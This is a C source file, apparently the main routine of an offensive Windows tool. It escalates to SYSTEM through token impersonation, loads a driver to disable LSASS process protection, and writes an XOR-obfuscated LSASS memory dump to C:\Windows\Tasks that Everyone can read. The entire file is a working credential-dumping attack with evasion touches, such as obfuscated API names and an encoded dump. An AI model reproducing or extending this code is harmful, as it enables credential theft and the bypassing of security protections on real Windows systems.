#define _CRT_SECURE_NO_WARNINGS
#include "defs.h"
#include "api.h"
#include "driver.h"
#include "token.h"
#include "memory.h"
#include "utils.h"
#include "dump.h"
#include "logger.h"

int main(void)
{
    // Initialize logger
    logfile = fopen("C:\\Windows\\Tasks\\log.txt", "a");
    setvbuf(logfile, NULL, _IONBF, 0); // Disable buffering

    // Resolve required API functions
    if (!ResolveAllApis()) {
        log_error("Failed to resolve required APIs.");
        return 1;
    }

    // Get SeDebugPrivilege
    if (!EnableSEDBGPRV()) {
        log_error("Failed to acquire needed privileges.");
        // return 1;
    }

    // Impersonate SYSTEM
    HANDLE hSystemToken = NULL;
    if (!GetSystemTokenAndDuplicate(&hSystemToken)) {
        log_error("Failed to duplicate SYSTEM token.");
        return 1;
    }

    if (!pIMP(hSystemToken)) {
        log_error("ImpersonateLoggedOnUser failed.");
        return 1;
    }

    if (!pSTT(NULL, hSystemToken)) {
        log_error("SetThreadToken failed.");
        return 1;
    }

    log_info("Running as SYSTEM.");

    // Load driver and disable PPL
    if (LoadAndStartDriver() != 0) {
        log_error("Failed to load driver.");
        return 1;
    }

    disablePPL();

    // Clone LSASS and create XOR'd dump
    if (!DumpAndXorLsass("C:\\Windows\\Tasks\\doppelganger.dmp", XOR_KEY, key_len)) {
        log_error("Failed to dump and XOR LSASS.");
        StopAndUnloadDriver(DRIVER_NAME);
        return 1;
    }

    // Set GENERIC_READ permissions to "Everyone"
    if (!SetFileGenericReadAccess("C:\\Windows\\Tasks\\doppelganger.dmp")) {
        log_error("Could not set GENERIC_READ permissions for Everyone.");
    }

    // Unload the driver
    StopAndUnloadDriver(DRIVER_NAME);

    // Done
    log_info("Execution completed successfully.");
    fclose(logfile);
    return 0;
}
